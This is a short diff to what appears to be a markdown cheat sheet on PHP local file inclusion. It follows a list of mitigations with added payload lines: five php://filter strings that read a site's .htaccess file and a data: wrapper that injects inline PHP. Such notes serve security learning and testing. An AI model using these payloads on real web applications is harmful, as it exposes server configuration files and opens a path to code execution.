@@ -41,3 +41,19 @@
 #### 6: Input validation
 
 #### 7: Allow only protocols and PHP wrappers in need.
+
+### PHP WRAPPERS
+
+#### 1) php://filter/convert.base64-encode/resource=.htaccess
+
+#### 2) php://filter/string.rot13/resource=.htaccess
+
+#### 3) php://filter/string.toupper/resource=.htaccess
+
+#### 4) php://filter/string.tolower/resource=.htaccess
+
+#### 5) php://filter/string.strip_tags/resource=.htaccess
+
+### DATA WRAPPER 
+
+#### data:text/plain,<?php phpinfo(); ?>
